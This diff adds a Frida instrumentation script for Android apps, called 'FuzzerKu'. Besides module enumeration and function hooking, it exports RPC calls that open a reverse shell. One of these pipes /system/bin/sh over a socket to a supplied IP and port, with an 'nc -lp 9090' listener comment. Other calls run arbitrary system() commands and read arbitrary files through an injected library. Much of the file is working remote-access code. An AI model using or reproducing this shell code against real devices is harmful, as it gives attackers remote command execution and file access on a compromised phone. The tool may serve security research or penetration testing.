@@ -1,0 +1,191 @@
+class FuzzerKu
+{
+    constructor() {
+       this.rpc_setup();
+       this.typeLog = "send";
+    }
+
+    locateData() {
+       const self = this;
+       Java.perform(function () {
+          var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
+
+          Java.scheduleOnMainThread(function() {
+             var toast = Java.use("android.widget.Toast");
+             toast.makeText(Java.use("android.app.ActivityThread").currentApplication().getApplicationContext(), Java.use("java.lang.String").$new("Fuzzer proxy v1.0"), 1).show();
+          });
+
+          //var data = context.getApplicationInfo().dataDir;
+          //self.pwd = data.value;
+
+          var data = context.getPackageName();
+          self.pwd = "/data/data/"+data;
+       });
+    }
+
+    locatelib() {
+       var modulesArray = Process.enumerateModules();
+       for (var i=0; i<modulesArray.length; i++)
+       {
+          if (modulesArray[i].path.indexOf(this.injectedlib) != -1)
+          {
+             var str = modulesArray[i].path;
+             return str.substring(0, str.lastIndexOf("/"))
+          }
+       }
+    }
+
+    sleep(ms) {
+        var start = new Date().getTime(), expire = start + ms;
+        while (new Date().getTime() < expire) { }
+        return;
+    }
+
+    logDebug(type, msg, subtype) {
+        if (type == "send") {
+           if (subtype == "em")
+               send({"type": "enum_modules", "log": msg});
+           else if (subtype == "es")
+               send({"type": "enum_symbols", "log": msg});
+
+           else if (subtype == "hook_hit")
+               send({"type": "hook_hit", "log": msg});
+
+           else if (subtype == "info")
+               send({"type": "info", "log": msg});
+        }
+        else if (type == "console") {
+           console.log(msg);
+        }
+    }
+
+    reverseShellJava(sip, sport) { // server listen: nc -lp 9090
+        Java.perform(function () {
+           const Socket = Java.use('java.net.Socket');
+           const OutputStream = Java.use('java.io.OutputStream');
+           const InputStream = Java.use('java.io.InputStream');
+           const JavaString = Java.use('java.lang.String');
+           const ProcessBuilder = Java.use('java.lang.ProcessBuilder');
+           const Thread = Java.use('java.lang.Thread');
+           const ArrayList = Java.use('java.util.ArrayList');
+           const host = JavaString.$new(sip);
+           const port = parseInt(sport);
+
+           console.log("connect to: "+sip)
+
+           var arr = Java.array('java.lang.String', ['/system/bin/sh']);
+           var p = ProcessBuilder.$new.overload('[Ljava.lang.String;').call(ProcessBuilder, arr).redirectErrorStream(true).start();
+           var s = Socket.$new.overload('java.lang.String', 'int').call(Socket, host, port);
+
+           var pi = p.getInputStream();
+           var pe = p.getErrorStream();
+           var si = s.getInputStream();
+
+           var po = p.getOutputStream(),
+           so = s.getOutputStream();
+
+           var i = 0;
+           while(!s.isClosed())
+           {
+              while(pi.available()>0) {
+                so.write(pi.read());
+              }
+              while(pe.available()>0) {
+                so.write(pe.read());
+              }
+              while(si.available()>0) {
+                po.write(si.read());
+              }
+              so.flush();
+              po.flush();
+
+              Thread.sleep(50);
+              try {
+                p.exitValue();
+                break;
+              } catch (e){
+                // ignore
+              }
+           }
+           p.destroy();
+           s.close();
+       });
+    }
+
+    rpc_setup()
+    {
+        rpc.exports = {
+            enummodules: () => {
+               this.logDebug("send", "Getting modules...", "info");
+
+               const output = Process.enumerateModulesSync();
+
+               this.logDebug("send", output, "em");
+            },
+            enumsymbols: (module) => {
+               this.logDebug("send", "Getting symbols...", "info");
+               const output = Module.enumerateSymbols(module)
+
+               this.logDebug("send", output, "es");
+            },
+            enumsymbolstrace: (module) => {
+               this.logDebug("send", "Getting symbols to hook...", "info");
+
+               const dick_sym = Module.enumerateSymbols(module)
+
+               this.logDebug("send", dick_sym, "es");
+
+               return dick_sym
+
+            },
+            setuphook: (func_name) => {
+
+               const subthis = this;
+               const addr = DebugSymbol.fromName(func_name).address;
+
+               Interceptor.attach(addr, {
+                   onEnter: function(args) {
+                       subthis.logDebug("send", func_name, "hook_hit");
+                   }
+               });
+
+            },
+            reshelljava: (sip, sport) => {
+               this.reverseShellJava(sip, sport);
+            },
+            reshell: (sip, sport, sbin) => {
+               const rshellAddr = DebugSymbol.fromName("reverse_shell").address;
+               const rshell = new NativeFunction(rshellAddr, "void", ["pointer", "pointer", "int"]);
+               const ip = Memory.allocUtf8String(sip);
+               const bin = Memory.allocUtf8String(sbin);
+               const port = parseInt(sport);
+
+               rshell(ip, bin, port);
+               return "[JS] fork shell created.";
+            },
+            shell: (cmd) => {
+               const systemAddr = DebugSymbol.fromName("system").address;
+               const system = new NativeFunction(systemAddr, "pointer", ["pointer"]);
+               const syscmd = Memory.allocUtf8String(cmd);
+               system(syscmd);
+
+               return 0;
+            },
+            readtext: (pathname_raw) => {
+               const read_textAddr = DebugSymbol.fromName("read_text").address;
+               const read_text = new NativeFunction(read_textAddr, "pointer", ["pointer"]);
+               const pathname = Memory.allocUtf8String(pathname_raw);
+
+               return read_text(pathname).readCString();
+            }
+        };
+    }
+
+}
+
+const f = new FuzzerKu();
+rpc.exports.fuzzer = f;
+
+
+
+
